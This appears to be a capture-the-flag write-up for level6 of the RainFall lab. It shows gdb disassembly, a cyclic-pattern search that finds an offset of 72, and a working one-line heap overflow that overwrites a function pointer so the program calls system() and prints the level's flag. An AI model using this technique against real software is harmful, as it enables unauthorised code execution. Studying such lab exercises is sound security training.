```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy
0x08048340  strcpy@plt
0x08048350  malloc
0x08048350  malloc@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  system
0x08048370  system@plt
0x08048380  __gmon_start__
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini
(gdb) 
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp                # Save old base pointer
   0x0804847d <+1>:     mov    %esp,%ebp           # Set up new base pointer
   0x0804847f <+3>:     and    $0xfffffff0,%esp    # Align the stack to a 16-byte boundary
   0x08048482 <+6>:     sub    $0x20,%esp          # Reserve 32 bytes on the stack for local variables
   0x08048485 <+9>:     movl   $0x40,(%esp)        # Push the value 64 (0x40) as an argument for malloc (buffer size)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>  # Call malloc to allocate 64 bytes
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)     # Store the returned pointer to the buffer at offset 0x1c on the stack
   0x08048495 <+25>:    movl   $0x4,(%esp)         # Push the value 4 as an argument for malloc (size for function pointer)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>  # Call malloc to allocate 4 bytes
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)     # Store the returned pointer for the function pointer at offset 0x18 on the stack
   0x080484a5 <+41>:    mov    $0x8048468,%edx     # Load the address 0x8048468 (target function) into %edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax     # Load the pointer to the function pointer memory into %eax
   0x080484ae <+50>:    mov    %edx,(%eax)         # Write the function address into the allocated function pointer memory
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax      # Load argv (the pointer to the array of command-line arguments) into %eax
   0x080484b3 <+55>:    add    $0x4,%eax           # Advance to the second element (argv[1])
   0x080484b6 <+58>:    mov    (%eax),%eax         # Dereference to obtain the pointer to the string in argv[1]
   0x080484b8 <+60>:    mov    %eax,%edx          # Copy the pointer to argv[1] into %edx (source for strcpy)
   0x080484ba <+62>:    mov    0x1c(%esp),%eax     # Load the pointer to the allocated buffer into %eax (destination for strcpy)
   0x080484be <+66>:    mov    %edx,0x4(%esp)       # Place the source pointer (argv[1]) as the second argument for strcpy on the stack
   0x080484c2 <+70>:    mov    %eax,(%esp)         # Place the destination pointer (buffer) as the first argument for strcpy on the stack
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>  # Call strcpy to copy the string from argv[1] into the buffer
   0x080484ca <+78>:    mov    0x18(%esp),%eax     # Load the pointer to the function pointer memory into %eax
   0x080484ce <+82>:    mov    (%eax),%eax         # Dereference to retrieve the function pointer value
   0x080484d0 <+84>:    call   *%eax              # Indirectly call the function pointed to by the function pointer (vulnerable point)
   0x080484d2 <+86>:    leave                   # Restore the previous stack frame (cleanup)
   0x080484d3 <+87>:    ret                     # Return from main

End of assembler dump.
```

```sh
(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave  
   0x0804847b <+19>:    ret    
End of assembler dump.
```

```sh
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave  
   0x08048467 <+19>:    ret    
End of assembler dump.
```

We are gonna exploit the function strcpy used in main and overflow it to call the function n

```sh
junya in ~/projects/42/cybersec/RainFall/level1/Ressources on main ● λ python3 cyclic.py 100              
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```sh
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```

```sh
junya in ~/projects/42/cybersec/RainFall/level1/Ressources on main ● λ python3 cyclic.py 100 0x41346341
Needle 'Ac4A' found at offset: 72
```

```sh
./level6 `python -c "print('A' * 72 + '\x54\x84\x04\x08')"`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```